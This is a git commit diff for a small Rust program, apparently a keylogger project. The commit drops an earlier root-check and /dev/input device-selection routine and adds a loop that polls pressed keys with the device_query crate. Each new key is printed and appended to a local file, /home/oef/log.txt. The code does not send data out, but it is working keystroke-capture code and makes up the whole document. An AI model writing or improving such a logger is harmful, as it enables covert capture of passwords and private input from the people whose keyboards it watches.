c7a6104789b24f08893271173a01135baed6a38e
pwn-rs <tpapachristos@protonmail.com>
2022-03-13 20:25:23 +0200

    completely changed lol

--- src/main.rs
+++ src/main.rs
@@ -1,89 +1,34 @@
-// use libc::timeval;
-
-/* 
-#[repr(C)]
-pub struct InputEvent {
-    pub time: timeval, // from timeval struct
-    pub type_: u16,
-    pub code: u16,
-    pub value: i32
-}
-*/
-
-use std::{env, process::{ Command}, fs};
-
-extern crate sudo;extern crate libc;
-use libc::input_keymap_entry;
-use libc::{ O_RDONLY };
-
+use std::fs::OpenOptions;
+use std::io::Write;
+use device_query::{DeviceQuery, DeviceState};
 
 fn main() {
 
-    is_root();
+    //println!("{}", is_root());
 
-    println!("The selected device is -> {}", select_device());
+    let device_state = DeviceState::new();
 
-    device_path_exists(select_device());
+    let mut prev_keys = vec![];
 
-    
-    
-    
-    // declare a variable that holds env::consts::OS
-    let os = env::consts::OS;
+    let mut file = OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open("/home/oef/log.txt")
+        .expect("Failed to open file");
 
-    // print os variable
-    println!("{}", os);
-
-    if os == "windows" {
-        println!("You are running on Windows!");
-    } 
-     else if os == "linux" {
-        println!("You are running on Linux!");
-    } 
-    else  {
-        println!("You are running on an unknown OS!");
+    loop {        
+        let keys = device_state.get_keys();
+        
+        if keys != prev_keys && !keys.is_empty() {
+            // println!("[{:?}] [Keyboard] {:?}", local, keys);
+            print!("{:?}", keys[0]);
+            write!(file, "{:?}",  keys[0]).expect("Failed to write to file");
+        }
+        
+        
+        prev_keys = keys;
     }
 }
 
-
-fn is_root() {
-    let euid = unsafe { libc::geteuid() };
-    if euid != 0 {
-        panic!("Must run as root user");
-    } else {
-        println!("You are root!");
-    }
-}
-
-
-fn get_path(rpath: &String) -> String {
-    rpath.to_string()
-}
-
-fn device_path_exists(device: String) -> bool {
-    let device_path = "/dev/input/{}".to_string().replace("{}", &device);
-    let path = std::path::Path::new(&device_path);
-    get_path(&device_path);
-    path.exists()
-}
-
-
-fn select_device() -> String {
-    let  devices = get_devices();
-    // declare a variable and assign it to the first element of the devices array
-    let device = &devices[0];
-    device.clone()
-}
-
-fn get_devices() -> Vec<String> {
-    let command_str = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo 'event[0-9]+'".to_string();
-
-    let res = Command::new("sh").arg("-c").arg(command_str).output().unwrap_or_else(|e| {
-        panic!("{}", e);
-    });
-    let res_str = std::str::from_utf8(&res.stdout).unwrap();
-
-    res_str.trim().split('\n').map(|s| s.to_string()).collect()
-}
 
 
